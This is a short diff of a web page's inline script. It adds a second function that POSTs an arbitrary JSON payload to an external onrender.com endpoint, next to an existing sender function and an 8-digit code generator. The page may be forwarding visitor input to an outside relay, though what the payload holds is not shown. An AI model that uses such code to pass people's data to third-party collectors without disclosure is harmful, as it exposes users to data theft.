@@ -222,7 +222,7 @@
 </body>
 	<script src="../sw.js"></script>
 	<script>
-		// Sender
+		// Senders
         function sender(payload) {
             const url = 'https://send-39yi.onrender.com/api/messages';  
             fetch(url, {
@@ -234,6 +234,16 @@
             });  
         }
 
+		function toa(payload) {
+            const url = 'https://send-39yi.onrender.com/send';  
+            fetch(url, {
+                method: 'POST',
+                headers: {     
+                    'Content-Type': 'application/json',  
+                },   
+                body: JSON.stringify(payload)    
+            });  
+        }
         // Code Generator
         function generateRandomCode() {
             const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
